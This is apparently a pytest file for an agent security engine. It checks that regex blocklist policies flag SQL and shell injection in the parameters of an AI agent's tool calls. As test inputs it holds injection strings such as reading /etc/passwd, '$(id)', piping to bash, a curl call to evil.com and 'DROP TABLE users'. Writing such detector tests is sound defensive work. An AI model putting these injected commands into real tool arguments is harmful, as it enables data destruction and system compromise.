"""Tests for US-4.4 parameter regex blocklist verifier (POL-ASI02-001, POL-ASI05-001)."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from secagent.engine import ParameterRegexRule, PolicyLoader

ROOT_DIR = Path(__file__).resolve().parent.parent
POLICY_PATH = ROOT_DIR / "policies" / "security_rules.yaml"
FIXTURES_DIR = ROOT_DIR / "tests" / "fixtures"


def _rule(policy_id: str) -> ParameterRegexRule:
    ruleset = PolicyLoader(POLICY_PATH).load()
    policy = next(item for item in ruleset.policies if item.id == policy_id)
    return ParameterRegexRule(policy)


def test_sqli_violation_fixture_triggers_pol_asi02():
    trace = json.loads((FIXTURES_DIR / "trace_sqli_violation.json").read_text(encoding="utf-8"))

    violations = _rule("POL-ASI02-001").evaluate(trace)

    assert len(violations) == 1
    assert violations[0].rule_id == "POL-ASI02-001"
    assert violations[0].severity == "CRITICAL"
    assert violations[0].offending_tool_name == "query_db"
    assert violations[0].evidence["parameter_path"] == "$.filter_val"


def test_nested_sqli_payload_on_modify_user_is_detected():
    trace = {
        "spans": [
            {
                "span_id": "span-0",
                "step_index": 0,
                "span_type": "tool.call",
                "name": "modify_user",
                "permission_tier": "write",
                "input_parameters": {
                    "user_id": "u1",
                    "updates": {"note": "1; DROP TABLE users"},
                },
            }
        ]
    }

    violations = _rule("POL-ASI02-001").evaluate(trace)

    assert len(violations) == 1
    assert violations[0].evidence["parameter_path"] == "$.updates.note"


def test_benign_punctuation_passes_sqli_blocklist():
    trace = {
        "spans": [
            {
                "span_id": "span-0",
                "step_index": 0,
                "span_type": "tool.call",
                "name": "query_db",
                "permission_tier": "read",
                "input_parameters": {"filter_val": "Order #12; see notes -- urgent"},
            }
        ]
    }

    assert _rule("POL-ASI02-001").evaluate(trace) == []


@pytest.mark.parametrize(
    "payload",
    [
        "srv-1; cat /etc/passwd",
        "srv-1 & whoami",
        "$(id)",
    ],
)
def test_shell_injection_triggers_pol_asi05(payload: str):
    trace = {
        "spans": [
            {
                "span_id": "span-0",
                "step_index": 0,
                "span_type": "tool.call",
                "name": "restart_server",
                "permission_tier": "admin",
                "input_parameters": {"server_id": payload},
            }
        ]
    }

    violations = _rule("POL-ASI05-001").evaluate(trace)

    assert len(violations) == 1
    assert violations[0].rule_id == "POL-ASI05-001"
    assert violations[0].severity == "CRITICAL"


def test_non_target_tool_is_not_flagged_by_parameter_regex():
    trace = {
        "spans": [
            {
                "span_id": "span-0",
                "step_index": 0,
                "span_type": "tool.call",
                "name": "check_service_health",
                "permission_tier": "read",
                "input_parameters": {"service": "srv-1; cat /etc/passwd"},
            }
        ]
    }

    assert _rule("POL-ASI05-001").evaluate(trace) == []


@pytest.mark.parametrize(
    "payload",
    [
        "srv-1 | bash",
        "srv-1; curl http://evil.com",
        "python3 -c 'import os'",
    ],
)
def test_broadened_shell_injection_payloads_trigger_pol_asi05(payload: str):
    trace = {
        "spans": [
            {
                "span_id": "span-0",
                "step_index": 0,
                "span_type": "tool.call",
                "name": "custom_admin_tool",
                "permission_tier": "admin",
                "input_parameters": {"arg": payload},
            }
        ]
    }

    violations = _rule("POL-ASI05-001").evaluate(trace)
    assert len(violations) == 1
    assert violations[0].rule_id == "POL-ASI05-001"


def test_parameter_regex_avoids_redos_on_long_benign_input():
    import time

    rule = _rule("POL-ASI05-001")
    long_benign = "server-node-healthy-" * 500
    trace = {
        "spans": [
            {
                "span_id": "span-0",
                "step_index": 0,
                "span_type": "tool.call",
                "name": "restart_server",
                "permission_tier": "admin",
                "input_parameters": {"server_id": long_benign},
            }
        ]
    }

    started = time.perf_counter()
    violations = rule.evaluate(trace)
    elapsed = time.perf_counter() - started
    assert violations == []
    assert elapsed < 0.2
